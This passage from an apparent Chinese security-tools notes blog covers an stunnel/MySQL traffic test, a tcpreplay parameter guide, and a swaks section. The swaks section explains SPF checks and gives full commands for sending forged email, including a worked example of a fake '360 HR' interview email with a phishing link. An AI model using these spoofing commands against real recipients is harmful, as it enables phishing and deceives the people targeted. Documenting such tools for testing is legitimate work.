&#x2F; start</li></ul><p>MySQL 客户端连接服务器</p><ul><li>mysql -u root -h 127.0.0.1</li></ul><p>抓包对比隧道前后差异</p></li></ul><h4 id="安装之前的测试环境"><a href="#安装之前的测试环境" class="headerlink" title="安装之前的测试环境"></a>安装之前的测试环境</h4><p>metasploitable：mysql （应用服务端）</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">仅主机：<span class="hljs-number">1.1.1.17</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161525073.png" alt="image-20220416152535936"></p><p>m0n0wall</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">仅主机：<span class="hljs-number">1.1.1.1</span><br>桥接：<span class="hljs-number">192.168.1.10</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161525608.png" alt="在这里插入图片描述"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161526239.png" alt="在这里插入图片描述"></p><p>外网访问192.168.1.10 的mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@kali:~<span class="hljs-comment"># mysql -u root -h 192.168.1.10</span><br>抓包发现明文显示 mysql 数据包<br></code></pre></td></tr></table></figure><h3 id="stunnel-测试环境"><a href="#stunnel-测试环境" class="headerlink" title="stunnel 测试环境"></a>stunnel 测试环境</h3><ul><li>metasploitable：mysql （应用服务端）</li></ul><p>详情看:</p><p><a href="https://blog.csdn.net/Kevinhanser/article/details/79857633">https://blog.csdn.net/Kevinhanser/article/details/79857633</a></p><h2 id="swaks"><a href="#swaks" class="headerlink" title="swaks"></a>swaks</h2><h3 id="描述：-88"><a href="#描述：-88" class="headerlink" title="描述："></a>描述：</h3><p>Swaks是一款类似于“瑞士军刀”的工具，之所以这么说是因为它在SMTP邮件协议领域有非常非常广泛的应用，同时对于一名信息安全高级工程师来说也是一个不错的利用工具！它通常被用来伪造邮件，进行钓鱼、社工等操作，但是这种也是具有一定风险的，同时在这里提醒广大用户在收到邮件时，不要直接打开邮件，先看看邮件的域名以及头标题等信息是否正确，不然一个贸然的操作有时候将可能导致自己被钓鱼甚至攻击！</p><h3 id="swaks简介："><a href="#swaks简介：" class="headerlink" title="swaks简介："></a><strong>swaks简介：</strong></h3><p>Swaks 是由John Jetmore编写和维护的功能强大、灵活、可编写脚本、面向事务的 SMTP 测试工具。同时对于一名信息安全高级工程师来说也是一个不错的利用工具！它通常被用来伪造邮件，进行钓鱼、社工等操作，但是这种也是具有一定风险的，同时在这里提醒广大用户在收到邮件时，不要直接打开邮件，先看看邮件的域名以及头标题等信息是否正确，不然一个贸然的操作有时候将可能导致自己被钓鱼甚至攻击！</p><p>下载：</p><p>kali 自带</p><p>官网：<a href="http://www.jetmore.org/john/code/swaks/">http://www.jetmore.org/john/code/swaks/</a></p><p>GitHub：<a href="https://github.com/jetmore/swaks">https://github.com/jetmore/swaks</a></p><p><strong>参数：</strong></p><p>-t –to 目标地址 -t  <a href="mailto:&#116;&#x65;&#115;&#116;&#64;&#x74;&#x65;&#x73;&#116;&#46;&#99;&#x6f;&#109;">&#116;&#x65;&#115;&#116;&#64;&#x74;&#x65;&#x73;&#116;&#46;&#99;&#x6f;&#109;</a></p><p>-f –from 来源地址 (发件人) -f “text”</p><p>–protocol 设定协议(未测试)</p><p>–body “<a href="http://www.baidu.com/">http://www.baidu.com</a>“  &#x2F;&#x2F;引号中的内容即为邮件正文；</p><p>–header “Subject:hello”  &#x2F;&#x2F;邮件头信息，subject为邮件标题</p><p>-ehlo 伪造邮件ehlo头</p><p>–data .&#x2F;Desktop&#x2F;email.txt  &#x2F;&#x2F;将正常源邮件的内容保存成TXT文件，再作为正常邮件发送；</p><h3 id="使用：-1"><a href="#使用：-1" class="headerlink" title="使用："></a><strong>使用：</strong></h3><p>在使用swaks进行伪造邮件时，我们要先确认对方是否开启了spf，如果开启了spf，那么是无法伪造邮件发送的。</p><p>nslookup -type&#x3D;txt qq.com &#x2F;&#x2F;windows</p><p>dig -t txt qq.com     &#x2F;&#x2F;linux</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012103484.png" alt="图片"></p><p>v&#x3D;spf1 指采用SPF1版本</p><p>“v&#x3D;spf1 -all” （拒绝所有，表示这个域名不会发出邮件）<br>“v&#x3D;spf1 +all” （接受所有）<br>“v&#x3D;spf1 ip4:192.168.0.1&#x2F;16 -all”（只允许 192.168.0.1&#x2F;16 范围内的IP发送邮件）<br>“v&#x3D;spf1 mx -all”（允许当前域名的 mx 记录对应的IP地址发送邮件）<br>“v&#x3D;spf1 mx mx:test.example.com -all”（允许当前域名和 test.example.com 的 mx 记录对应的IP地址发送邮件）<br>“v&#x3D;spf1 a mx ip4:173.194.72.103 -all”（允许当前域名的 a 记录和 mx 记录和一个给定的IP地址发送邮件）<br>“v&#x3D;spf1 include:example.com -all”（采用和 example.com 一样的SPF记录）</p><p>接下来用临时邮箱做测试</p><p>临时邮箱地址：<a href="https://www.linshi-email.com/">https://www.linshi-email.com/</a></p><p>swaks -to <a href="mailto:&#x74;&#99;&#113;&#x69;&#x6f;&#97;&#99;&#x63;&#111;&#119;&#64;&#x69;&#x75;&#98;&#114;&#105;&#x64;&#x67;&#101;&#46;&#99;&#x6f;&#109;">&#x74;&#99;&#113;&#x69;&#x6f;&#97;&#99;&#x63;&#111;&#119;&#64;&#x69;&#x75;&#98;&#114;&#105;&#x64;&#x67;&#101;&#46;&#99;&#x6f;&#109;</a></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012103591.png" alt="图片"></p><p>如图所示返回即表示可以进行伪造邮件发送</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012103528.png" alt="图片"></p><p>接下来我们进行伪造发送</p><p>swaks –header-X-Mailer “” –header-Message-Id “” –header-“Content-Type”&#x3D;”text&#x2F;html” –from “安全测试部” –ehlo shabimeiguo -header “Subject: 测试” –body 我们做了一个测试 –to <a href="mailto:&#x74;&#99;&#x71;&#x69;&#x6f;&#97;&#99;&#99;&#111;&#x77;&#64;&#105;&#x75;&#x62;&#114;&#x69;&#100;&#x67;&#101;&#x2e;&#99;&#x6f;&#109;">&#x74;&#99;&#x71;&#x69;&#x6f;&#97;&#99;&#99;&#111;&#x77;&#64;&#105;&#x75;&#x62;&#114;&#x69;&#100;&#x67;&#101;&#x2e;&#99;&#x6f;&#109;</a></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012103543.png" alt="图片"></p><p>然后我们这边也成功收到了邮件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012103551.png" alt="图片"></p><p>我们详细看看内容</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202205012103500.png" alt="图片"></p><p>其他用法</p><p>附件</p><p>swaks –header-X-Mailer “” –header-Message-Id “” –header-“Content-Type”&#x3D;”text&#x2F;html” –from “安全测试部” –ehlo shabimeiguo -header “Subject: 测试” –body 我们做了一个测试 –to <a href="mailto:&#x74;&#99;&#113;&#105;&#111;&#x61;&#x63;&#99;&#111;&#119;&#64;&#x69;&#117;&#x62;&#x72;&#105;&#100;&#103;&#101;&#46;&#99;&#x6f;&#109;">&#x74;&#99;&#113;&#105;&#111;&#x61;&#x63;&#99;&#111;&#119;&#64;&#x69;&#117;&#x62;&#x72;&#105;&#100;&#103;&#101;&#46;&#99;&#x6f;&#109;</a> –attach 附件.zip</p><p>临时邮箱地址：</p><p><a href="https://www.linshi-email.com/">https://www.linshi-email.com/</a></p><p>基本使用语法：</p><p>1、swaks –to <a href="mailto:&#x74;&#101;&#x73;&#116;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;">&#x74;&#101;&#x73;&#116;&#x40;&#113;&#x71;&#46;&#99;&#111;&#109;</a>   &#x2F;&#x2F;测试邮箱的连通性；</p><p>2、参数说明（这里只是简单的罗列了一些，至于更加具体的内容可以使用–help进行查看了解）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">--from  <span class="hljs-built_in">test</span>@qq.com     //发件人邮箱；<br><br>--ehlo   qq.com      //伪造邮件ehlo头，即是发件人邮箱的域名。提供身份认证<br><br>--body  <span class="hljs-string">&quot;http://www.baidu.com&quot;</span>    //引号中的内容即为邮件正文；<br><br>--header  <span class="hljs-string">&quot;Subject:hello&quot;</span>   //邮件头信息，subject为邮件标题<br><br>--data   ./Desktop/email.txt    //将正常源邮件的内容保存成TXT文件，再作为正常邮件发送<br></code></pre></td></tr></table></figure><h3 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h3><p>伪造一份来自360hr的邮件，收件人为<a href="mailto:&#x67;&#x61;&#119;&#x70;&#121;&#x63;&#x30;&#x34;&#57;&#x36;&#56;&#x40;&#x63;&#x68;&#x61;&#99;&#117;&#x6f;&#46;&#x6e;&#101;&#116;">&#x67;&#x61;&#119;&#x70;&#121;&#x63;&#x30;&#x34;&#57;&#x36;&#56;&#x40;&#x63;&#x68;&#x61;&#99;&#117;&#x6f;&#46;&#x6e;&#101;&#116;</a>，内容为:”Congratulations on your 360 interview. Please click on the link below to enter our employee information page.  <a href="https://fishing.com/test.php">https://fishing.com/test.php</a>“</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161533798.png" alt="image-20220416153333493"></p><p><strong>邮箱查看：</strong></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204161533493.png" alt="image-20220416153357342"></p><h1 id="T"><a href="#T" class="headerlink" title="T"></a>T</h1><h2 id="tcpreplay"><a href="#tcpreplay" class="headerlink" title="tcpreplay"></a>tcpreplay</h2><h3 id="描述：-89"><a href="#描述：-89" class="headerlink" title="描述："></a>描述：</h3><p>简单的说, tcpreplay是一种pcap包的重放工具, 它可以将用ethreal, <a href="https://so.csdn.net/so/search?q=wireshark&spm=1001.2101.3001.7020">wireshark</a>工具抓下来的包原样或经过任意修改后重放回去. 它允许你对报文做任意的修改(主要是指对2层, 3层, 4层报文头), 指定重放报文的速度等, 这样tcpreplay就可以用来复现抓包的情景以定位bug, 以极快的速度重放从而实现压力测试。</p><p><strong>tcpreplay本身包含了几个辅助工具（tcpprep、tcprewrite、tcpreplay和tcpbridge）</strong>, 用于准备发包的cache, 重写报文等。<strong>这也是 Tcpreplay 的第一个字母大写T的原因 。</strong></p><p>  　　 * tcpprep - 简单的说就是划分哪些包是client的, 哪些是server的, 一会发包的时候client的包从一个网卡发, server的包可能从另一个网卡发。</p><p>　　　　　　　　即区分pcap数据包的流向，即区分出客户端和服务器。<br>  　　* tcprewrite - 简单的说就是修改2层, 3层, 4层报文头部。</p><p>　　　　　　　　即改写pcap数据包的2-4层的头部信息，即MAC地址、IP地址和PORT等。<br>  　　* tcpreplay - 真正发包, 可以选择主、从网卡, 发包速度等。</p><p>　　　　　　　　即回放pcap文件中的数据包。</p><p>　　　* tcpreplay-edit-更写pcap数据并回放，将tcprewrite和tcpreplat一条命令实现。<br>        　　* tcpbridge - bridge two network segments with the power of tcprewrite。</p><h3 id="参数：-72"><a href="#参数：-72" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br></pre></td><td class="code"><pre><code class="hljs bash">P:&lt;list&gt; – Must be one of the listed packets <span class="hljs-built_in">where</span> the list corresponds to the packet number <span class="hljs-keyword">in</span> the capture file.<br><br>Ex: -xP:1-5,9,15 would only send packets 1 through 5, 9 and 15.<br><br>根据参数后的参数值（报文编号）发送指定的报文。可以在ethereal中确认报文的编号，然后把需要的报文发送。可以用于排除ARP报文。<br><br>F:<span class="hljs-string">&quot;&lt;filter&gt;&quot;</span> – BPF filter. See the tcpdump(8) man page <span class="hljs-keyword">for</span> syntax.<br><br>未知，以后补充。<br><br>-X &lt;match&gt; Send all the packets except those specified<br><br>可选参数，就是-x参数的取反，参数内容也是一样。<br><br>-v Verbose<br><br>可选参数，显示trpprep生成cache文件的处理过程，就是一些信息的即时打印。<br><br>-V Version<br><br>显示版本号。<br>Tcpprep使用小结<br><br>再构造cache文件的过程中我用的比较多的选项参数就-v、-P、-xB、-xP，一般都是client和server的模式，其它两种模式没有实验过，暂时还不知道怎么使用，bridge模式我使用过一次，结果发现报文是从一个网卡送出。<br><br>对于tcp和udp协议都做了测试，是可以支持的，icmp还没有成功。对于网络上的BT报文，只要你有pcap文件，也是可以构造cache文件来模拟完全真实的BT流量。<br><br>目前的使用就是这么多，感觉还是很有用的，tcpreplay的参数有一部分是和tcpprep重复，下面的帮助文件说明就不详细说明了，但是特殊有好用的参数会使用蓝色字体标记出来给予重视。存在的不足是还没有学会在nat模式下重放报文，现在所有的报文重放都是在透明模式下完成的。<br>Tcpreplay帮助文件说明<br><br>Usage: tcpreplay [args] &lt;file(s)&gt;<br><br>-A <span class="hljs-string">&quot;&lt;args&gt;&quot;</span> Pass arguments to tcpdump decoder (use w/ -v)<br><br>可选参数，在使用tcpdump风格打印输出信息时，同时再调用tcpdump中的参数，默认已经带有“-n,-l”，所以一般看到的都是ip地址，而没有主机名的打印，注意这个是在tcpreplay使用了-v参数时，才能使用，不带-v不会报错，但是没有实际意义。格式：-vA “nnt”表示以tcpdump风格输出报文信息，并且不打印时间戳、主机名、端口服务名称。注意不要使用-c参数来指定打印的数据报文的个数，这样发送出去的报文也会变少。<br><br>-b Bridge two broadcast domains <span class="hljs-keyword">in</span> sniffer mode<br><br>可选参数，没有用过<br><br>-c &lt;cachefile&gt; Split traffic via cache file<br><br>双网卡回放报文必选参数，后面紧跟cache文件名，该文件为tcpprep根据对应的pcap文件构造出来。<br><br>-C &lt;CIDR1,CIDR2,…&gt; Split traffic by matching src IP<br><br>可选参数，<br><br>-D Data dump mode (<span class="hljs-built_in">set</span> this BEFORE -w and -W)<br><br>可选参数，把应用层的数据，使用dump mode写入到指定文件中去，和-w、-W参数一起使用。<br><br>-e &lt;ip1:ip2&gt; Specify IP endpoint rewriting<br><br>可选参数，指定端点的ip，即把发送报文的和接收的报文的ip都修改称对应的参数值中指定的ip，但是这样发送的出的报文不会区分client和server，还没有发现使用的地方。<br><br>-f &lt;configfile&gt; Specify configuration file<br><br>可选参数，指定配置文件，目前不会使用。<br><br>-F Fix IP, TCP, UDP and ICMP checksums<br><br>可选参数，在发送报文时，自动纠正错误的校验和。对测试DUT的校验和检验还是有用的。<br><br>-h Help<br><br>显示帮助文件。<br><br>-i &lt;nic&gt; Primary interface to send traffic out of<br><br>双网卡回放报文必选参数，指定主接口。<br><br>-I &lt;mac&gt; Rewrite dest MAC on primary interface<br><br>可选参数，重写主网卡发送出报文的目的MAC地址。<br><br>-j &lt;nic&gt; Secondary interface to send traffic out of<br><br>双网卡回放报文必选参数，指定从接口。<br><br>-J &lt;mac&gt; Rewrite dest MAC on secondary interface<br><br>可选参数，重写从网卡发送出报文的目的MAC地址。<br><br>-k &lt;mac&gt; Rewrite <span class="hljs-built_in">source</span> MAC on primary interface<br><br>可选参数，重写主网卡发送报文的源MAC地址。<br><br>-K &lt;mac&gt; Rewrite <span class="hljs-built_in">source</span> MAC on secondary interface<br><br>可选参数，重写从网卡发送报文的源MAC地址。<br><br>-l &lt;loop&gt; Specify number of <span class="hljs-built_in">times</span> to loop<br><br>可选参数，指定循环的次数，测试过程发现不是那么好用，有待确认。<br><br>-L &lt;<span class="hljs-built_in">limit</span>&gt; Specify the maximum number of packets to send<br><br>可选参数，指定最大的发包数量。可以在确认连接的调试时使用。<br><br>-m &lt;multiple&gt; Set replay speed to given multiple<br><br>可选参数，指定一个倍数值，就是必默认发送速率要快多少倍的速率发送报文。加大发送的速率后，对于DUT可能意味着有更多的并发连接和连接数，特别是对于BT报文的重放，因为连接的超时是固定的，如果速率增大的话，留在session表中的连接数量增大，还可以通过修改连接的超时时间来达到该目的。<br><br>-M Disable sending martian IP packets<br><br>可选参数，表示不发送“火星”的ip报文，man文件中的定义是0/8、172/8、255/8。<br><br>-n Not nosy mode (not promisc <span class="hljs-keyword">in</span> sniff/bridge mode)<br><br>可选参数，在使用-S参数，不对混杂模式进行侦听。没有测试过。<br><br>-N &lt;CIDR1:CIDR2,…&gt; Rewrite IP’s via pseudo-NAT<br><br>可选参数，通过伪造的NAT，重写IP地址。这个参数应该有很重要的应用，目前没有测试使用。<br><br>-O One output mode<br><br>可选参数，没有测试使用<br><br>-p &lt;packetrate&gt; Set replay speed to given rate (packets/sec)<br><br>可选参数，指定每秒发送报文的个数，指定该参数，其它速率相关的参数被忽略，最后的打印信息不会有速率和每秒发送报文的统计。<br><br>-P Print PID<br><br>可选参数，表示在输出信息中打印PID的信息，用于单用户或单帐户模式下暂停和重启程序。<br><br>-r &lt;rate&gt; Set replay speed to given rate (Mbps)<br><br>可选参数，指定发送的速率。目前-m/-r/-p这3个参数的相互关系还需要确认。<br><br>-R Set replay speed to as fast as possible<br><br>可选参数，让报文线速发送。<br><br>-s &lt;seed&gt; Randomize src/dst IP addresses w/ given seed<br><br>可选参数，<br><br>-S &lt;snaplen&gt; Sniff interface(s) and <span class="hljs-built_in">set</span> the snaplen length<br><br>可选参数，<br><br>-t &lt;mtu&gt; Override MTU (defaults to 1500)<br><br>可选参数，指定MTU，标准的10/100M网卡的默认值是1500。<br><br>-T Truncate packets &gt; MTU so they can be sent<br><br>可选参数，截去报文中MTU大于标准值的部分再发送出去，默认是不发送，skip掉。目前还有疑问，为什么会产生MTU大于1500字节的包，在BT报文中，这种包比较常见。<br><br>-u pad|trunc Pad/Truncate packets <span class="hljs-built_in">which</span> are larger than the snaplen<br><br>可选参数，后面的参数值二选一，snaplen是指保留数据包的长度，这里的trunc参数值和MTU没有任何关系，不要混淆。<br><br>-v Verbose: <span class="hljs-built_in">print</span> packet decodes <span class="hljs-keyword">for</span> each packet sent<br><br>可选参数，没发送一个报文都以tcpdump的风格打印出对应的信息。<br><br>-V Version<br><br>查看版本号。<br><br>-w &lt;file&gt; Write (primary) packets or data to file<br><br>可选参数，将主网卡发送的报文写入一个文件中，参数后紧跟文件名。<br><br>-W &lt;file&gt; Write secondary packets or data to file<br><br>可选参数，将从网卡发送的报文写入一个文件中，参数后紧跟文件名。<br><br>-x &lt;match&gt; Only send the packets specified<br><br>可选参数，发送匹配参数值的报文，这里各个参数具体的含义和tcpprep中的一样，<br><br>S:&lt;CIDR1&gt;,… – Src IP must match specified CIDR(s)<br><br>在CIDR模式下必须匹配源IP，格式：-xS:100.1.1.0/24,10.10.10.0/26。多个用逗号隔开，参数个数没有试过，3个没有问题。<br><br>D:&lt;CIDR1&gt;,… – Dst IP must match specified CIDR(s)<br><br>在CIDR模式下必须匹配目的IP，格式同上。<br><br>B:&lt;CIDR1&gt;,… – Both src and dst addresses must match<br><br>必须同时匹配源和目的IP，格式同上。<br><br>E:&lt;CIDR1&gt;,… – Either src or dst address must match<br><br>匹配源或目的IP，格式同上。<br><br>P:&lt;list&gt; – Must be one of the listed packets <span class="hljs-built_in">where</span> the list corresponds to the packet number <span class="hljs-keyword">in</span> the capture file.<br><br>Ex: -xP:1-5,9,15 would only send packets 1 through 5, 9 and 15.<br><br>根据参数后的参数值（报文编号）发送指定的报文。可以在ethereal中确认报文的编号，然后把需要的报文发送。可以用于排除ARP报文。<br><br>F:<span class="hljs-string">&quot;&lt;filter&gt;&quot;</span> – BPF filter. See the tcpdump(8) man page <span class="hljs-keyword">for</span> syntax.<br><br>未知，以后补充。<br><br>-X &lt;match&gt; Send all the packets except those specified<br><br>可选参数，-x的参数内容取反。参数内容一样。<br><br>-1 Send one packet per key press<br><br>可选参数，参数内容就是阿拉伯数字1，这个参数对于确定连接的建立，相当好用，根据按回车键发送报文，可以将报文一个一个发送，来判断连接的状态。也可以用于故障定位。<br><br>-2 &lt;datafile&gt; Layer 2 data<br><br>可选参数，在2层加入数据。<br><br>-4 &lt;PORT1:PORT2,…&gt; Rewrite port numbers<br><br>可选参数，重写端口号，对于测试特殊端口的应用比较实用。<br><br>&lt;file1&gt; &lt;file2&gt; … File list to replay<br><br>可选参数，没有实验过。<br>配置实例<br><br>1、 重放在客户端ftp连接的报文<br><br>a、 在客户端使用ethereal抓包，存为ftp.pcap文件<br><br>b、 将ftp.pcap文件进行tcpprep操作，制作cache文件。<br><br>[root@A ~]<span class="hljs-comment"># tcpprep -an client -i ftp.pcap -o ftp.cache –v</span><br><br>c、 将DUT设备的两个接口和PC的两个接口使用网线连接，使用tcpreplay重放报文。注意防火墙的配置为网桥（透明）模式。<br><br>[root@A ~]<span class="hljs-comment"># tcpreplay -c ftp.cache -i eth0 -j eth1 ftp.pcap -R –v</span><br><br>-R参数表示全速发送，-v显示打印信息。<br><br>2、 重放在客户端BT连接的报文<br><br>a、 在实验室BT下载一些台湾的娱乐节目和热门的大片，使用ethereal抓包，存为bt.pcap文件。注意pcap文件大小的控制，对pc的内存要求比较高，我保存了一个600多M的pcap文件用了40多分钟，大家有需要可以直接从实验室copy。<br><br>b、 将bt.pcap文件进行tcpprep操作，制作cache文件。<br><br>[root@A ~]<span class="hljs-comment"># tcpprep -an client -i bt.pcap -o bt.cache -C &quot;100M BT Packet&quot; 